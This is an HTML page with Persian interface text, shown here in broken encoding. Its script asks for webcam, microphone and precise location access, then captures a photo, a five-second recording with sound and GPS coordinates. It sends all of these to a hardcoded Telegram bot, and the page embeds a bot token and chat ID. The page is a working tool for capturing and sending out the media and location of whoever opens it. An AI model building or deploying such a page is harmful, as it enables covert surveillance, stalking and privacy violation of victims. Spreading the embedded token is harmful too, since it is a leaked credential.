<!DOCTYPE html>
<html lang="fa" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Ú¯Ø±ÙØªÙ† Ø¯Ø³ØªØ±Ø³ÛŒ Ùˆ Ø§Ø±Ø³Ø§Ù„ Ø¨Ù‡ ØªÙ„Ú¯Ø±Ø§Ù…</title>
    <style>
        body { font-family: Tahoma, sans-serif; text-align: center; padding: 20px; background: #f0f2f5; }
        .container { max-width: 400px; margin: 0 auto; background: white; padding: 20px; border-radius: 15px; box-shadow: 0 4px 10px rgba(0,0,0,0.1); }
        video { width: 100%; max-width: 300px; border-radius: 10px; margin: 10px 0; }
        button { background: #0088cc; color: white; border: none; padding: 12px 24px; font-size: 16px; border-radius: 8px; cursor: pointer; }
        button:disabled { background: #ccc; cursor: not-allowed; }
        #status { margin: 15px 0; font-weight: bold; color: #0088cc; }
        #error { color: #d32f2f; margin: 10px 0; }
        .loader { border: 4px solid #f3f3f3; border-top: 4px solid #0088cc; border-radius: 50%; width: 30px; height: 30px; animation: spin 1s linear infinite; margin: 10px auto; display: none; }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
    </style>
</head>
<body>
    <div class="container">
        <h2>ØªØ³Øª Ø¯Ø³ØªØ±Ø³ÛŒ</h2>
        <p>Ø±ÙˆÛŒ Ø¯Ú©Ù…Ù‡ Ú©Ù„ÛŒÚ© Ú©Ù†ÛŒØ¯ ØªØ§ Ø¯Ø³ØªØ±Ø³ÛŒâ€ŒÙ‡Ø§ Ú¯Ø±ÙØªÙ‡ Ø¨Ø´Ù‡ Ùˆ Ø¨Ù‡ ØªÙ„Ú¯Ø±Ø§Ù… ÙØ±Ø³ØªØ§Ø¯Ù‡ Ø¨Ø´Ù‡.</p>

        <video id="webcam" autoplay playsinline muted></video>
        <div class="loader" id="loader"></div>

        <button id="startBtn">Ø´Ø±ÙˆØ¹ Ø¶Ø¨Ø· Ùˆ Ø§Ø±Ø³Ø§Ù„</button>
        <div id="status"></div>
        <div id="error"></div>
    </div>

    <script>
        // ==== ØªÙ†Ø¸ÛŒÙ…Ø§Øª ØªÙ„Ú¯Ø±Ø§Ù… ====
        const BOT_TOKEN = '8584809785:AAH0ZKscGQtQQl38yTcjq4wMRiWw1xWEON4';  // ØªÙˆÚ©Ù† Ø¨Ø§Øª
        const CHAT_ID = '6080665310';      // Ú†Øª Ø¢ÛŒØ¯ÛŒ (Ø¹Ø¯Ø¯)

        const webcam = document.getElementById('webcam');
        const startBtn = document.getElementById('startBtn');
        const status = document.getElementById('status');
        const error = document.getElementById('error');
        const loader = document.getElementById('loader');

        let stream = null;
        let recorder = null;

        startBtn.addEventListener('click', async () => {
            startBtn.disabled = true;
            loader.style.display = 'block';
            status.textContent = 'Ø¯Ø± Ø­Ø§Ù„ Ø¯Ø±Ø®ÙˆØ§Ø³Øª Ø¯Ø³ØªØ±Ø³ÛŒ...';
            error.textContent = '';

            try {
                // 1. Ø¯Ø³ØªØ±Ø³ÛŒ Ø¨Ù‡ ÙˆØ¨Ú©Ù… Ùˆ Ù…ÛŒÚ©Ø±ÙˆÙÙˆÙ†
                stream = await navigator.mediaDevices.getUserMedia({
                    video: { facingMode: 'user', width: 640, height: 480 },
                    audio: true
                });
                webcam.srcObject = stream;
                status.textContent = 'Ø¯Ø³ØªØ±Ø³ÛŒ Ø¯Ø§Ø¯Ù‡ Ø´Ø¯. Ø¯Ø± Ø­Ø§Ù„ Ø¶Ø¨Ø·...';

                // 2. Ú¯Ø±ÙØªÙ† Ø§Ø³Ú©Ø±ÛŒÙ†â€ŒØ´Ø§Øª
                const photoBlob = await capturePhoto();

                // 3. Ø¶Ø¨Ø· ÙˆÛŒØ¯ÛŒÙˆ 5 Ø«Ø§Ù†ÛŒÙ‡â€ŒØ§ÛŒ
                const videoBlob = await recordVideo(stream);

                // 4. Ú¯Ø±ÙØªÙ† Ù„ÙˆÚ©ÛŒØ´Ù† Ø¯Ù‚ÛŒÙ‚
                const location = await getLocation();

                // 5. Ø§Ø±Ø³Ø§Ù„ Ø¨Ù‡ ØªÙ„Ú¯Ø±Ø§Ù…
                await sendToTelegram(photoBlob, videoBlob, location);

                status.textContent = 'Ù‡Ù…Ù‡ Ú†ÛŒØ² Ø¨Ø§ Ù…ÙˆÙÙ‚ÛŒØª Ø§Ø±Ø³Ø§Ù„ Ø´Ø¯!';
            } catch (err) {
                error.textContent = `Ø®Ø·Ø§: ${err.message}`;
                console.error(err);
            } finally {
                stopStream();
                startBtn.disabled = false;
                loader.style.display = 'none';
            }
        });

        // Ú¯Ø±ÙØªÙ† Ø¹Ú©Ø³ Ø§Ø² ÙˆØ¨Ú©Ù…
        function capturePhoto() {
            return new Promise((resolve) => {
                const canvas = document.createElement('canvas');
                canvas.width = webcam.videoWidth;
                canvas.height = webcam.videoHeight;
                const ctx = canvas.getContext('2d');
                ctx.drawImage(webcam, 0, 0);
                canvas.toBlob(blob => resolve(blob), 'image/jpeg', 0.8);
            });
        }

        // Ø¶Ø¨Ø· ÙˆÛŒØ¯ÛŒÙˆ
        function recordVideo(stream) {
            return new Promise((resolve) => {
                const chunks = [];
                recorder = new MediaRecorder(stream, { mimeType: 'video/mp4' });
                
                recorder.ondataavailable = e => chunks.push(e.data);
                recorder.onstop = () => {
                    const blob = new Blob(chunks, { type: 'video/mp4' });
                    resolve(blob);
                };

                recorder.start();
                setTimeout(() => recorder.stop(), 5000); // 5 Ø«Ø§Ù†ÛŒÙ‡
            });
        }

        // Ú¯Ø±ÙØªÙ† Ù„ÙˆÚ©ÛŒØ´Ù† Ø¯Ù‚ÛŒÙ‚
        function getLocation() {
            return new Promise((resolve, reject) => {
                navigator.geolocation.getCurrentPosition(
                    pos => {
                        const { latitude, longitude, accuracy } = pos.coords;
                        const mapLink = `https://maps.google.com/?q=${latitude},${longitude}`;
                        resolve({ latitude, longitude, accuracy, mapLink });
                    },
                    reject,
                    { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
                );
            });
        }

        // Ø§Ø±Ø³Ø§Ù„ Ø¨Ù‡ ØªÙ„Ú¯Ø±Ø§Ù…
        async function sendToTelegram(photoBlob, videoBlob, location) {
            const text = `
ğŸ“ <b>Ù„ÙˆÚ©ÛŒØ´Ù† Ø¯Ù‚ÛŒÙ‚</b>
Ø¹Ø±Ø¶ Ø¬ØºØ±Ø§ÙÛŒØ§ÛŒÛŒ: <code>${location.latitude}</code>
Ø·ÙˆÙ„ Ø¬ØºØ±Ø§ÙÛŒØ§ÛŒÛŒ: <code>${location.longitude}</code>
Ø¯Ù‚Øª: <code>${location.accuracy.toFixed(1)} Ù…ØªØ±</code>
<a href="${location.mapLink}">Ù†Ù‚Ø´Ù‡</a>
            `.trim();

            // Ø§Ø±Ø³Ø§Ù„ Ø¹Ú©Ø³
            const photoForm = new FormData();
            photoForm.append('chat_id', CHAT_ID);
            photoForm.append('photo', photoBlob, 'webcam.jpg');
            photoForm.append('caption', text);
            photoForm.append('parse_mode', 'HTML');
            await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
                method: 'POST',
                body: photoForm
            });

            // Ø§Ø±Ø³Ø§Ù„ ÙˆÛŒØ¯ÛŒÙˆ
            const videoForm = new FormData();
            videoForm.append('chat_id', CHAT_ID);
            videoForm.append('video', videoBlob, 'recording.mp4');
            videoForm.append('caption', 'ÙˆÛŒØ¯ÛŒÙˆ Ûµ Ø«Ø§Ù†ÛŒÙ‡â€ŒØ§ÛŒ Ø¨Ø§ ØµØ¯Ø§');
            await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendVideo`, {
                method: 'POST',
                body: videoForm
            });
        }

        // ØªÙˆÙ‚Ù Ø§Ø³ØªØ±ÛŒÙ…
        function stopStream() {
            if (stream) {
                stream.getTracks().forEach(track => track.stop());
                webcam.srcObject = null;
            }
            if (recorder && recorder.state === 'recording') {
                recorder.stop();
            }
        }
    </script>
</body>
</html>
